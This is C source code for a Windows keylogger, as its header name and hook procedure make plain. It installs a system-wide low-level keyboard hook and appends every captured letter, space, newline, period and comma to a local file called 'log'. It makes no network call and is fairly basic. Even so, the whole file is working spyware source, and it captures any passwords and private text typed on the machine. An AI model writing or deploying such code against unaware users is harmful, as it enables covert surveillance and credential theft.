#include <stdio.h>

#include "keylogger.h"

HHOOK hook = NULL;
int charCount = 0;

LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    FILE *f;
    f = fopen("log", "a+");

	if (nCode < 0)
    {
        CallNextHookEx(hook, nCode, wparam, lparam);
    }

	KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*) lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
        if (kb->vkCode >= 0x41 && kb->vkCode <= 0x5A)
        {
            char c = (char) kb->vkCode;
            fprintf(f, "%c", c);
        }
        else
        {
            switch (kb->vkCode)
            {
                case VK_RETURN:
                    fprintf(f, "\n");
                    break;
                case VK_SPACE:
                    fprintf(f, " ");
                    break;
                case VK_OEM_PERIOD:
                    fprintf(f, ".");
                    break;
                case VK_OEM_COMMA:
                    fprintf(f, ",");
                    break;
                default:
                    fprintf(f, "");
                    break;
            };
        }
	}

    fclose(f);

	return CallNextHookEx(hook, nCode, wparam, lparam);
}

int setupHook()
{
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeylogProc, GetModuleHandle(NULL), 0);
	return hook == NULL;
}

int removeHook()
{
	int unhook_status = UnhookWindowsHookEx(hook);
	hook = NULL;
	return unhook_status;
}

int main()
{
	if (setupHook() != 0)
    {
        printf("Error setting hook.\n\n");
        return -1;
    }

	MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
	{
        TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

    if (removeHook() != 0)
    {
        printf("Error removing hook.\n\n");
        return -1;
    }

	return 0;
}